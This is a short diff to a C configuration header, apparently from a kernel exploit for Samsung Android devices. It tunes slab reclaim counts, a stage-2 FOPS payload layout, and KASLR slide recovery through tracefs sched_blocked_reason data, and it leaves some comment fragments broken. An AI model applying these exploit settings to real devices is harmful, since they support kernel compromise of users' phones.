@@ -215,21 +215,15 @@
 #define PIPE_RECLAIM_SLABS 15
 #define PIPE_DRAIN_SLABS   4
 
-#endif /* OFFSET_H */
-
-
 /* Stage-2 FOPS pselect waiter layout. Without this, the fops stage
  * uses the default tree layout and never produces a write during
  * pselect observation (matches sibling android14 targets). */
 #define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
 
- * by stage 1's gate write and its bank entry is built with the default
-
- * PI-tree geometry. Slot 0 is the only slot the non-diag FOPS payload
- * writes to (util.c:1899). Selecting any other slot reads an
-
-/* Use tracefs-based KASLR slide recovery. Every confirmed Samsung port
- * (pa3q-S938N, dm3q, gts9, etc.) enables this. Reads sched_switch
- * event data from /sys/kernel/tracing to derive the KASLR slide
- * directly — no p0 oracle write race, no ret=0 window failures. */
+/* Use tracefs-based KASLR slide recovery. Reads sched_blocked_reason
+ * tracepoint data from /sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw
+ * to derive the KASLR slide directly — no p0 oracle write race, no
+ * ret=0 window failures. Every confirmed Samsung port enables this. */
 #define APP_TRACEFS_SLIDE 1
+
+#endif /* OFFSET_H */
